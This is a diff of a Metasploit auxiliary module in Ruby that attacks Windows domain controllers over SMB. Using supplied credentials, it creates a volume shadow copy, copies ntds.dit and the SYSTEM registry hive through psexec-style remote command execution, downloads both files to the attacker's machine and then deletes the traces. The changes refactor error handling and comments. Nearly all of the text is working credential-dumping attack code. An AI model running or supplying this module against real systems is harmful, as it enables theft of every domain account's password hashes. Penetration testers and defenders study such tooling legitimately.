@@ -28,14 +28,11 @@ class Metasploit3 < Msf::Auxiliary
 			},
 
 			'Author'         => [
-				'Royce Davis <rdavis[at]accuvant.com>',
-				'Twitter: <[at]R3dy__>',
+				'Royce @R3dy__ Davis <rdavis[at]accuvant.com>',
 			],
 
 			'License'        => MSF_LICENSE,
 			'References'     => [
-				[ 'URL', 'http://www.pentestgeek.com' ],
-				[ 'URL', 'http://www.accuvant.com' ],
 				[ 'URL', 'http://sourceforge.net/projects/smbexec.' ],
 			],
 		))
@@ -51,9 +48,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#---------------------------------
 	# This is the main control method
-	#---------------------------------
 	def run_host(ip)
 		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
 		bat = "C:\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
@@ -61,16 +56,9 @@ class Metasploit3 < Msf::Auxiliary
 		createvsc = "vssadmin create shadow /For=%SYSTEMDRIVE%"
 		logdir = datastore['LOGDIR']
 
-		#Try and Connect to the target
-		begin
-			connect()
-		rescue StandardError => connecterror
-			print_error("Unable to connect to the target: #{connecterror}")
-			return
-		end
-
 		#Try and authenticate with given credentials
 		begin
+			connect()
 			smb_login()
 		rescue StandardError => autherror
 			print_error("Unable to authenticate with given credentials: #{autherror}")
@@ -79,28 +67,27 @@ class Metasploit3 < Msf::Auxiliary
 
 		smbshare = datastore['SMBSHARE']
 
-		begin
-			check_vss(smbshare, ip)
-			vscpath = make_volume_shadow_copy(smbshare, ip, cmd, createvsc, text, bat)
-			copy_ntds(smbshare, ip, cmd, vscpath)
-			copy_sys_hive(smbshare, ip, cmd)
-			download_ntds(smbshare, "\\WINDOWS\\Temp\\ntds", ip, logdir)
-			download_sys_hive(smbshare, "\\WINDOWS\\Temp\\sys", ip, logdir)
-			cleanup_after(smbshare, ip, cmd)
-			disconnect()
-		rescue
-			# Something went terribly wrong
-			return
+		check_vss(smbshare, ip)
+		# First make sure we can create the new VSC
+		if vscpath = make_volume_shadow_copy(smbshare, ip, cmd, createvsc, text, bat)
+			# If we are successul, try and copy NTDS.dit and SYSTEM hive files
+			n = copy_ntds(smbshare, ip, cmd, vscpath)
+			s =copy_sys_hive(smbshare, ip, cmd)
+			if n == nil && s == nil 
+				# If the above succeeds then we just have to download our files
+				download_ntds(smbshare, "\\WINDOWS\\Temp\\ntds", ip, logdir)
+				download_sys_hive(smbshare, "\\WINDOWS\\Temp\\sys", ip, logdir)
+			end
 		end
+		cleanup_after(smbshare, ip, cmd)
+		disconnect()
 	end
 
 
 
-	#-----------------------------------------------------------------------------------
 	# Check if VSS is enabled on the target host
 	# As far as I can tell the VSS service doesn't need to acctually be running
 	# in order to create a VSC with vssadmin.  AS of now this function does nothing...
-	#-----------------------------------------------------------------------------------
 	def check_vss(smbshare, ip)
 		begin
 			# Run net start command to check for vss
@@ -112,9 +99,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#-----------------------------------------------------------------------
 	# Create a Volume Shadow Copy on the target host
-	#-----------------------------------------------------------------------
 	def make_volume_shadow_copy(smbshare, ip, cmd, createvsc, text, bat)
 		begin
 			#Try to create the shadow copy
@@ -126,7 +111,7 @@ class Metasploit3 < Msf::Auxiliary
 			vscpath = get_vscpath(ip, text)
 		rescue StandardError => vscerror
 			print_error("Unable to create the Volume Shadow Copy: #{vscerror}")
-			return vscerror
+			return nil
 		end
 		begin
 			cleanup = "#{cmd} /C del C:#{text} & del #{bat}"
@@ -135,7 +120,7 @@ class Metasploit3 < Msf::Auxiliary
 			psexec(smbshare, cleanup)
 		rescue StandardError => cleanuperror
 			print_error("Cleanup Command failed: #{cleanuperror}")
-			return cleanuperror
+			return nil
 		end
 		print_good("Volume Shadow Copy created on #{vscpath}")
 		return vscpath
@@ -143,9 +128,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#----------------------------------------------------------------------------------------------------------
 	# Copy ntds.dit from the Volume Shadow copy to the Windows Temp directory on the target host
-	#----------------------------------------------------------------------------------------------------------
 	def copy_ntds(smbshare, ip, cmd, vscpath)
 		print_status("Copying ntds.dit to Windows Temp directory")
 		begin
@@ -154,6 +137,7 @@ class Metasploit3 < Msf::Auxiliary
 			command = "#{cmd} /C copy /Y #{ntdspath} C:\\WINDOWS\\Temp\\ntds"
 			simple.connect(smbshare)
 			psexec(smbshare, command)
+			return nil
 		rescue StandardError => ntdscopyerror
 			print_error("Unable to copy ntds.dit from Volume Shadow Copy.  Make sure target is a Windows Domain Controller: #{ntdscopyerror}")
 			return ntdscopyerror
@@ -162,10 +146,8 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#-------------------------------------------------------------------------------------------
 	# Create a copy of the SYSTEM hive file and stores it in the Windows
 	# Temp directory on the target host
-	#-------------------------------------------------------------------------------------------
 	def copy_sys_hive(smbshare, ip, cmd)
 		print_status("Copying SYSTEM hive file to Windows Temp directory")
 		begin
@@ -173,6 +155,7 @@ class Metasploit3 < Msf::Auxiliary
 			command = "#{cmd} /C reg.exe save HKLM\\SYSTEM C:\\WINDOWS\\Temp\\sys /y"
 			simple.connect(smbshare)
 			psexec(smbshare, command)
+			return nil
 		rescue StandardError => hiveerror
 			print_error("Unable to copy the SYSTEM hive file: #{hiveerror}")
 			return hiveerror
@@ -181,9 +164,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#-------------------------------------------------------------------
 	# Download the ntds.dit copy to your attacking machine
-	#-------------------------------------------------------------------
 	def download_ntds(smbshare, file, ip, logdir)
 		print_status("Downloading ntds.dit file")
 		begin
@@ -207,9 +188,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#----------------------------------------------------------------------
 	# Download the SYSTEM hive copy to your attacking machine
-	#----------------------------------------------------------------------
 	def download_sys_hive(smbshare, file, ip, logdir)
 		print_status("Downloading SYSTEM hive file")
 		begin
@@ -233,9 +212,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#-----------------------------------------------------------------------------------------
 	# Delete the ntds.dit and SYSTEM hive copies from the Windows Temp directory
-	#-----------------------------------------------------------------------------------------
 	def cleanup_after(smbshare, ip, cmd)
 		print_status("Deleting ntds.dit and SYSTEM hive copies:")
 		begin
@@ -251,29 +228,30 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#-----------------------------------------------------
 	# Gets the path to the Volume Shadow Copy
-	#-----------------------------------------------------
 	def get_vscpath(ip, file)
-		prepath = '\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'
-		vsc = ""
-		simple.connect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
-		outfile = simple.open(file, 'ro')
-		output = outfile.read
-		output.each_line do |line|
-			vsc += line if line.include?("Volume Name:")
+		begin
+			prepath = '\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'
+			vsc = ""
+			simple.connect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
+			outfile = simple.open(file, 'ro')
+			output = outfile.read
+			output.each_line do |line|
+				vsc += line if line.include?("GLOBALROOT")
+			end
+			outfile.close
+			simple.disconnect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
+			return prepath + vsc.split("ShadowCopy")[1].chomp
+		rescue StandardError => vscpath_error
+			print_error("Could not determine the exact path to the VSC")
+			return nil
 		end
-		outfile.close
-		simple.disconnect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
-		return prepath + vsc.split("ShadowCopy")[1].chomp
 	end
 
 
 
-	#------------------------------------------------------------------------------------------------------------------------
 	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
 	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
-	#------------------------------------------------------------------------------------------------------------------------
 	def psexec(smbshare, command)
 		filename = "filename"
 		servicename = "servicename"
